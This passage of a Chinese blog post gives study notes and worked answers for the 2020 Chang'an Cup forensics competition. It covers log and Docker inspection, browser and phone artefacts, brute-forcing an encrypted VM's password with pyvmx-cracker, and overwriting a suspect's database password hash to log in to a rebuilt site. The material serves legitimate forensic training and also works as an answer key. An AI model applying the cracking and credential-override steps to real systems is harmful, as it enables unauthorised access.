可以查看文件时间状态"></a>输入 <code>stat [文件名]</code> 可以查看文件时间状态</h5><h5 id="输入-more-bash-history-查看历史操作记录"><a href="#输入-more-bash-history-查看历史操作记录" class="headerlink" title="输入 more .bash_history 查看历史操作记录"></a>输入 <code>more .bash_history</code> 查看历史操作记录</h5><h4 id="可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径"><a href="#可以输入-docker-exec-it-容器ID前两位即可-bin-bash-，-查找相关文件的容器内部路径" class="headerlink" title="可以输入 docker exec -it [容器ID前两位即可] /bin/bash ， 查找相关文件的容器内部路径"></a>可以输入 docker exec -it [容器ID前两位即可] /bin/bash ， 查找相关文件的容器内部路径</h4><h4 id="输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）"><a href="#输入-find-name-名字-可以搜索所需要的配置文件（-conf结尾）或-日志文件（-log结尾）" class="headerlink" title="输入 find / -name [名字] 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）"></a>输入 <code>find / -name [名字]</code> 可以搜索所需要的配置文件（.conf结尾）或 日志文件（.log结尾）</h4><h1 id="服务器相关思路"><a href="#服务器相关思路" class="headerlink" title="服务器相关思路"></a>服务器相关思路</h1><h2 id="访问流程"><a href="#访问流程" class="headerlink" title="访问流程"></a>访问流程</h2><h3 id="嫌疑人-gt-检材服务器-gt-内部容器-gt-web网页"><a href="#嫌疑人-gt-检材服务器-gt-内部容器-gt-web网页" class="headerlink" title="嫌疑人 -&gt; 检材服务器 -&gt; 内部容器 -&gt; web网页"></a>嫌疑人 -&gt; 检材服务器 -&gt; 内部容器 -&gt; web网页</h3><h2 id="一般使用工具"><a href="#一般使用工具" class="headerlink" title="一般使用工具"></a>一般使用工具</h2><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><p>通过查看nginx的相关文件获得题目所需信息</p>
+<p>配置文件：大概目录 <code>/etc/nginx/conf.d/</code></p>
+<p>日志文件：大概目录 <code>/var/log/nginx/access.log</code></p>
+<h2 id="网站对应web对外开放端口"><a href="#网站对应web对外开放端口" class="headerlink" title="网站对应web对外开放端口"></a>网站对应web对外开放端口</h2><h3 id="对应例题：-4"><a href="#对应例题：-4" class="headerlink" title="对应例题："></a>对应例题：</h3><p>4、检材 1 中网站“<a href="http://www.kkzjc.com”对应的/">www.kkzjc.com”对应的</a> Web 服务对外开放的端口是（）</p>
+<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>直接在取证大师中搜索<a href="http://www.kkzjc.com,得到txt文本.找到开放端口/">www.kkzjc.com，得到txt文本。找到开放端口</a></p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022192049614.png" alt="image-20211022192049614"></p>
+<h2 id="服务器对外开放域名"><a href="#服务器对外开放域名" class="headerlink" title="服务器对外开放域名"></a>服务器对外开放域名</h2><h3 id="对应例题：-5"><a href="#对应例题：-5" class="headerlink" title="对应例题："></a>对应例题：</h3><p>5、 检材 1 所在的服务器共绑定了（）个对外开放的域名</p>
+<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>由于题目的连贯性，上题对应的网址应也视作域名，在其文本目录下发现其他三个域名的文本文档，故域名数为3</p>
+<h2 id="远程登陆检材所在服务器"><a href="#远程登陆检材所在服务器" class="headerlink" title="远程登陆检材所在服务器"></a>远程登陆检材所在服务器</h2><h3 id="对应例题：-6"><a href="#对应例题：-6" class="headerlink" title="对应例题："></a>对应例题：</h3><p>7、嫌疑人曾经远程登录过检材 1 所在的服务器，分析并找出其登录使用的 IP 地址是（）</p>
+<p>6、检材 1 所在的服务器的原始 IP 地址是（）</p>
+<p>9、嫌疑人曾经从题 7 的 IP 地址，通过 WEB 方式远程访问过网站，统计出检材 1 中该 IP 出现的次数为（）</p>
+<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><h5 id="在终端上输入-last-可以显示近期用户或终端的登录情况"><a href="#在终端上输入-last-可以显示近期用户或终端的登录情况" class="headerlink" title="在终端上输入 last ,可以显示近期用户或终端的登录情况"></a>在终端上输入 <code>last</code> ,可以显示近期用户或终端的登录情况</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022192944701.png" alt="image-20211022192944701"></p>
+<p>可以获取嫌疑人的登陆使用的ip地址</p>
+<h5 id="在终端上输入-docker-logs-容器ID-，可以获得服务器与容器联系的相关信息"><a href="#在终端上输入-docker-logs-容器ID-，可以获得服务器与容器联系的相关信息" class="headerlink" title="在终端上输入 docker logs [容器ID]，可以获得服务器与容器联系的相关信息"></a>在终端上输入 <code>docker logs [容器ID]</code>，可以获得服务器与容器联系的相关信息</h5><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022194258171.png" alt="image-20211022194258171"></p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022194024673.png" alt="image-20211022194024673"></p>
+<p>在其中可以找到两个IP地址   大意为 192.168.99.222（嫌疑人IP）访问了192.168.99.3（服务器的原始IP地址）:8091（端口）</p>
+<h5 id="由于这上面显示的信息太多，在终端输入docker-logs-08-grep-192-168-99-222-wc-l-。得到答案"><a href="#由于这上面显示的信息太多，在终端输入docker-logs-08-grep-192-168-99-222-wc-l-。得到答案" class="headerlink" title="由于这上面显示的信息太多，在终端输入docker logs 08 | grep 192.168.99.222 | wc -l 。得到答案"></a>由于这上面显示的信息太多，在终端输入<code>docker logs 08 | grep 192.168.99.222 | wc -l</code> 。得到答案</h5><h2 id="反向代理转发后台网络的IP地址"><a href="#反向代理转发后台网络的IP地址" class="headerlink" title="反向代理转发后台网络的IP地址"></a>反向代理转发后台网络的IP地址</h2><h3 id="对应例题：-7"><a href="#对应例题：-7" class="headerlink" title="对应例题："></a>对应例题：</h3><p>8、检材 1 所在的服务器，其主要功能之一为反向代理。找出“<a href="http://www.kkzjc.com”转发的后台网站所使用的/">www.kkzjc.com”转发的后台网站所使用的</a> IP 地址是（）</p>
+<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>进入docker容器，找到nginx的配置文件，查看得到ip地址</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022193517236.png" alt="image-20211022193517236"></p>
+<h1 id="浏览器历史记录"><a href="#浏览器历史记录" class="headerlink" title="浏览器历史记录"></a>浏览器历史记录</h1><h2 id="访问服务器网站"><a href="#访问服务器网站" class="headerlink" title="访问服务器网站"></a>访问服务器网站</h2><h3 id="对应例题-3"><a href="#对应例题-3" class="headerlink" title="对应例题"></a>对应例题</h3><p>15、嫌疑人通过 Web 方式，从检材 2 访问检材 1 所在的服务器上的网站时，连接的目 标端口是（）</p>
+<p>17、嫌疑人从检材 2 上访问该网站时，所使用的域名为（）</p>
+<h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师 -&gt; 上网记录</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022203336124.png" alt="image-20211022203336124"></p>
+<p>域名填写答案 <code>www.sdhj.com</code>即可</p>
+<h1 id="手机取证"><a href="#手机取证" class="headerlink" title="手机取证"></a>手机取证</h1><h2 id="寻找手机备份文件，用火眼手机证据分析软件分析"><a href="#寻找手机备份文件，用火眼手机证据分析软件分析" class="headerlink" title="寻找手机备份文件，用火眼手机证据分析软件分析"></a>寻找手机备份文件，用火眼手机证据分析软件分析</h2><p>一般该类备份文件被置于最显眼的地方，文件名设置为手机操作系统+日期的组合，如apple_20200920，便于寻找，</p>
+<h2 id="嫌疑人常用软件"><a href="#嫌疑人常用软件" class="headerlink" title="嫌疑人常用软件"></a>嫌疑人常用软件</h2><p>微信、QQ都可以看一看，说不定有意想不到的收获</p>
+<h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p>18、检材 2 中，嫌疑人所使用的微信 ID 是（）</p>
+<p>19、分析检材 2，嫌疑人为推广其网站，与广告位供应商沟通时使用的通联工具的名称 为（</p>
+<p>20、分析检材 2，嫌疑人使用虚拟货币与供应商进行交易，该虚拟货币的名称是（）</p>
+<p>21、上述交易中，对方的收款地址是（）</p>
+<p>比较简单就不写解题思路了（懒）</p>
+<h1 id="虚拟机的密码"><a href="#虚拟机的密码" class="headerlink" title="虚拟机的密码"></a>虚拟机的密码</h1><h2 id="对应例题-4"><a href="#对应例题-4" class="headerlink" title="对应例题"></a>对应例题</h2><p>24、检材 2 中，嫌疑人使用的虚拟机的虚拟磁盘被加密，其密码为（）</p>
+<h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><h3 id="导出虚拟机相关文件"><a href="#导出虚拟机相关文件" class="headerlink" title="导出虚拟机相关文件"></a>导出虚拟机相关文件</h3><p>导出后缀名为vmx(爆破主要对此文件进行，为虚拟机的配置文件)，vmdk(虚拟机的快照库，为主要文件)</p>
+<h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p><a href="https://github.com/axcheron/pyvmx-cracker">https://github.com/axcheron/pyvmx-cracker</a></p>
+<p>进入上述链接下载代码 pyvmx-cracker.py</p>
+<p>复制虚拟机的 .vmx 文件进入,改名为 1.vmx —(方便打字,可不做)</p>
+<p><code>python .\pyvmx-cracker.py -v 1.vmx -d wordlist.txt</code></p>
+<p>即可爆破出密码</p>
+<h3 id="密码消除"><a href="#密码消除" class="headerlink" title="密码消除"></a>密码消除</h3><p>用Vmware打开该配置文件，点击编辑虚拟机设置，选到选项，访问控制里点击移除加密</p>
+<h3 id="剩下的就可以交给取证大师和火眼仿真啦"><a href="#剩下的就可以交给取证大师和火眼仿真啦" class="headerlink" title="剩下的就可以交给取证大师和火眼仿真啦"></a>剩下的就可以交给取证大师和火眼仿真啦</h3><h1 id="程序使用方面"><a href="#程序使用方面" class="headerlink" title="程序使用方面"></a>程序使用方面</h1><h2 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h2><h3 id="对应例题-5"><a href="#对应例题-5" class="headerlink" title="对应例题"></a>对应例题</h3><p>25、检材 2 中，嫌疑人发送给广告商的邮件中的图片附件的 SHA256 值为（）；（忽略 邮件状态） （答案格式：“abcdefg” 小写字母</p>
+<p>26、检材 2 中，嫌疑人给广告商发送广告图片邮件的发送时间是（）（忽略邮件状态） （答案格式：“2020-01-01 21:35” 精确到分钟，半角符号</p>
+<p>27、检材 2 中，嫌疑人的邮箱密码是（） （答案格式：“abcde123456” 字母符号数字组合，区分大小写）</p>
+<h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>取证大师分析虚拟机镜像，即可得到附件，账号密码等</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211022220406786.png" alt="image-20211022220406786"></p>
+<h1 id="网站重构"><a href="#网站重构" class="headerlink" title="网站重构"></a>网站重构</h1><h2 id="系统登陆问题"><a href="#系统登陆问题" class="headerlink" title="系统登陆问题"></a>系统登陆问题</h2><p>我在做题的时候对检材三使用火眼仿真创建虚拟机失败，但得知Administrator账户为空密码，故转用Vm虚拟机打开，使用空密码登陆时要求用户重设密码，但多次设置均显示密码强度不够，一番尝试后发现 <code>./123ASD</code>  可以，并成功登录系统。</p>
+<h2 id="找到部署的网站信息"><a href="#找到部署的网站信息" class="headerlink" title="找到部署的网站信息"></a>找到部署的网站信息</h2><h3 id="对应例题-6"><a href="#对应例题-6" class="headerlink" title="对应例题"></a>对应例题</h3><p>32、检材 3 中，部署的网站名称是（）</p>
+<p>33、检材 3 中，部署的网站对应的网站根目录是（）</p>
+<p>34、检材 3 中，部署的网站绑定的端口是（）</p>
+<p>35、检材 3 中，具备登陆功能的代码页，对应的文件名为（）</p>
+<p>36、检材 3 中，请对网站代码进行分析，网站登录过程中，代码中对输入的明文密码 作了追加（）字符串处理 </p>
+<p>37、检材 3 中，请对网站代码进行分析，网站登录过程中，代码中调用的动态扩展库 文件的完整名称为（）</p>
+<p>38、检材 3 中，网站登录过程中，后台接收到明文密码后进行加密处理，首先使用的 算法是 Encryption 中的（）函数</p>
+<p>39、检材 3 中，分析该网站连接的数据库地址为（）</p>
+<p>40、检材 3 中，网站连接数据库使用的密码为（）（不会！！！！！）</p>
+<p>41、检材 3 中，网站连接数据库服务器的端口是（）</p>
+<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>找到 开始 -&gt; 管理工具 -&gt; Internet 信息服务（IIS）管理器 打开</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023120842632.png" alt="image-20211023120842632"></p>
+<p>选中 网站 -&gt; card -&gt; 高级设置 里面可以查看 <strong>网站根目录</strong> 和 <strong>绑定的端口</strong> </p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121052964.png" alt="image-20211023121052964"></p>
+<p>我们进入网站的根目录，下面找到网站的配置文件web.config ，打开后发现具备登录功能的代码页（login）</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121520019.png" alt="image-20211023121520019"></p>
+<p>打开后发现有行代码为 x.value+=’0v0’ 故可获得答案</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023121646330.png" alt="image-20211023121646330"></p>
+<p>顺便找到了动态拓展库</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023122030821.png" alt="image-20211023122030821"></p>
+<p>紧接上题，我们在根目录的 bin 文件夹打开上述的动态拓展库，</p>
+<p>仅仅是文本打开，并且靠运气找到加密函数（我也不信）</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023123317933.png" alt="image-20211023123317933"></p>
+<p>一开始想法局限于VM虚拟机，想着怎样把文件拖出来到计算机里分析，后来才意识到取证大师可以导出虚拟机内的文件。。。，之后用dotPeek分析即可</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023123923803.png" alt="image-20211023123923803"></p>
+<p>我也不知道为什么一定是DBManager.dll ，但是的确从里面找到了</p>
+<p>server=192.168.1.174、端口1433、uid=sa、pwd=31415926</p>
+<p>（密码用加密函数加密后表示为BASE64编码，需要继续研究，就先不深究了）</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20211023124323866.png" alt="image-20211023124323866"></p>
+<h2 id="part4-（摘自大佬的WP，冲不下去了哭）"><a href="#part4-（摘自大佬的WP，冲不下去了哭）" class="headerlink" title="part4 （摘自大佬的WP，冲不下去了哭）"></a>part4 （摘自大佬的WP，冲不下去了哭）</h2><blockquote>
+<p>充满玄学的一部分</p>
+<p>向天高呼保佑,有几率进入下一步</p>
+</blockquote>
+<h3 id="设置检材4的数据库"><a href="#设置检材4的数据库" class="headerlink" title="设置检材4的数据库"></a>设置检材4的数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 启动docker服务</span><br><span class="line">systemctl start docker</span><br><span class="line">// 列出所有在运行的容器信息</span><br><span class="line">docker ps // 没东西,说明没启动,需要自己启动一下</span><br><span class="line">// 显示所有的容器，包括未运行的</span><br><span class="line">docker ps -a</span><br><span class="line">// 启动docker里面的容器</span><br><span class="line">docker start 3f</span><br><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125042696.png" alt="img/image-20201127125042696"></p>
+<p>从<strong>part3</strong>连接数据库部分可以得知,我们的数据库ip是<code>192.168.1.174</code></p>
+<p>所以关闭该虚拟机的DHCP服务</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125519549.png" alt="img/image-20201127125519549"></p>
+<p>编辑下述文件修改静态ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/sysconfig/network-scripts/ifcfg-eth数字</span><br></pre></td></tr></table></figure>
+
+<p>修改/添加内容</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BOOTPROTO=&quot;static&quot; #dhcp改为static </span><br><span class="line">ONBOOT=&quot;yes&quot; #开机启用本配置</span><br><span class="line">IPADDR=192.168.1.174 #静态IP</span><br><span class="line">GATEWAY=192.168.1.1 #默认网关</span><br><span class="line">NETMASK=255.255.255.0 #子网掩码</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127125931153.png" alt="img/image-20201127125931153"></p>
+<p>重启网络服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service network restart</span><br></pre></td></tr></table></figure>
+
+<p>这步失败了,改了好久都不能重启服务成功,干脆直接重启虚拟机了</p>
+<p>结果意外好了&gt;&lt;</p>
+<p>查看ip</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip addr</span><br></pre></td></tr></table></figure>
+
+<p>像下图这样就说明静态ip设置成功了</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127133110453.png" alt="img/image-20201127133110453"></p>
+<h3 id="设置检材3的服务器"><a href="#设置检材3的服务器" class="headerlink" title="设置检材3的服务器"></a>设置检材3的服务器</h3><p>网络配置使其与检材4位于同一网段,开启DHCP服务,使其可以ping通</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127133622279.png" alt="img/image-20201127133622279"></p>
+<p>网页进入<code>ip/dl</code>,即可看到重构的网页</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127140235443.png" alt="img/image-20201127140235443"></p>
+<h3 id="主机"><a href="#主机" class="headerlink" title="主机"></a>主机</h3><ol>
+<li><p>连接数据库</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127143808886.png" alt="img/image-20201127143808886"></p>
+<p>从检材PC可知,嫌疑人使用的用户是 <strong>liwente1314520</strong></p>
+</li>
+</ol>
+<ol start="2">
+<li><p>在<strong>TD_User表</strong>中将其密码改为123456</p>
+<ul>
+<li><p>逆向dll时,可知存在数据库里的密码经过如下处理</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符串拼接: &quot;密码&quot;+&quot;OvO&quot;</span><br><span class="line">加密: 使用DBManager.dll中的加密方法加密</span><br><span class="line">md5: 加密后计算md5值,并存入数据库</span><br></pre></td></tr></table></figure></li>
+<li><p>下图进行拼接和加密</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127144737619.png" alt="img/image-20201127144737619"></p>
+</li>
+<li><p>下图md5计算</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127144814666.png" alt="img/image-20201127144814666"></p>
+</li>
+<li><p>下图修改表中的值</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145245384.png" alt="img/image-20201127145245384"></p>
+</li>
+</ul>
+</li>
+</ol>
+<ol start="3">
+<li><p>将服务器现在的ip添加到<strong>TD_Webs</strong>中</p>
+<p>同样是从dll逆向出来得知,执行登录操作时会检测域名</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145103070.png" alt="img/image-20201127145103070"></p>
+</li>
+</ol>
+<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul>
+<li><p>检材3</p>
+<p>cmd–services.msc   (本地服务设置)</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127145625474.png" alt="img/image-20201127145625474"></p>
+</li>
+<li><p>检材4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker restart 容器id</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以用 <strong>liwente1314520</strong> <strong>123456</strong> 登录网站了</p>
+</li>
+</ul>
+<h3 id="42-的原始磁盘-SHA256"><a href="#42-的原始磁盘-SHA256" class="headerlink" title="42.的原始磁盘 SHA256"></a>42.的原始磁盘 SHA256</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201126195142183.png" alt="img/image-20201126195142183"></p>
+<h3 id="43-嫌疑用户的推广链接中参数里包含的-ID-是"><a href="#43-嫌疑用户的推广链接中参数里包含的-ID-是" class="headerlink" title="43.嫌疑用户的推广链接中参数里包含的 ID 是"></a>43.嫌疑用户的推广链接中参数里包含的 ID 是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151654651.png" alt="img/image-20201127151654651"></p>
+<h3 id="44-该网站后台的代理用户数量"><a href="#44-该网站后台的代理用户数量" class="headerlink" title="44.该网站后台的代理用户数量"></a>44.该网站后台的代理用户数量</h3><p>统计一下个数即可</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151811242.png" alt="img/image-20201127151811242"></p>
+<h3 id="45-该网站注册用户中共有过几个代理"><a href="#45-该网站注册用户中共有过几个代理" class="headerlink" title="45.该网站注册用户中共有过几个代理"></a>45.该网站注册用户中共有过几个代理</h3><p>上题中的用户数是未删除的个数,注册过的也就包括了之前注册,但是删掉了的用户数</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127151905956.png" alt="img/image-20201127151905956"></p>
+<h3 id="46-2019-年-10-月-1-日后补发成功的金额总值"><a href="#46-2019-年-10-月-1-日后补发成功的金额总值" class="headerlink" title="46.2019 年 10 月 1 日后补发成功的金额总值"></a>46.2019 年 10 月 1 日后补发成功的金额总值</h3><p>数量略多,需要导出,使用excel或其他软件处理计算</p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152103903.png" alt="img/image-20201127152103903"></p>
+<h3 id="47-对“TX-IpLog”表进行分析，所有在“武汉市”登录的次数为"><a href="#47-对“TX-IpLog”表进行分析，所有在“武汉市”登录的次数为" class="headerlink" title="47.对“TX_IpLog”表进行分析，所有在“武汉市”登录的次数为"></a>47.对“TX_IpLog”表进行分析，所有在“武汉市”登录的次数为</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152253898.png" alt="img/image-20201127152253898"></p>
+<h3 id="48-该嫌疑人下属代理“liyun10”账户下的余额有多少元"><a href="#48-该嫌疑人下属代理“liyun10”账户下的余额有多少元" class="headerlink" title="48.该嫌疑人下属代理“liyun10”账户下的余额有多少元"></a>48.该嫌疑人下属代理“liyun10”账户下的余额有多少元</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152510630.png" alt="img/image-20201127152510630"></p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152550329.png" alt="img/image-20201127152550329"></p>
+<p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152634952.png" alt="img/image-20201127152634952"></p>
+<h3 id="49-接上题-该用户的推广-ID-是"><a href="#49-接上题-该用户的推广-ID-是" class="headerlink" title="49.接上题,该用户的推广 ID 是"></a>49.接上题,该用户的推广 ID 是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152724022.png" alt="img/image-20201127152724022"></p>
+<h3 id="50-接上题，该代理商户的最后一次登陆时间是"><a href="#50-接上题，该代理商户的最后一次登陆时间是" class="headerlink" title="50.接上题，该代理商户的最后一次登陆时间是"></a>50.接上题，该代理商户的最后一次登陆时间是</h3><p><img src="/2021/10/18/%E9%95%BF%E5%AE%89%E6%9D%AF2020%E4%BE%8B%E9%A2%98%E7%AC%94%E8%AE%B0/image-20201127152827440.png" alt="img/image-20201127152827440"></p>
+<h1 id="疑难杂症"><a href="#疑难杂症" class="headerlink" title="疑难杂症"></a>疑难杂症</h1><p>16、接 15 题，该端口上运行的进程的程序名称（Program name）为（） （答案格式：“avahi-deamon” 字母和半角符号组合）</p>
+<p>22、上述交易中，嫌疑人和供应商的交易时间是（） （答案格式：“2020-01-01 21:35:54” 精确到秒，半角符号</p>
+<p>23、上述交易中，嫌疑人支付货币的数量为（） （答案格式：“8888” 纯数字</p>
+<p>28、检材 2 中，嫌疑人使用了（）远程管理工具，登录了检材 1 所在的服务</p>
+<p>29、检材 2 中，嫌疑人使用上述工具连接服务器时，使用的登录密码为（） （答案格式：“aBcd#123”</p>
 ]]></content>
       <tags>
         <tag>电子数据取证</tag>
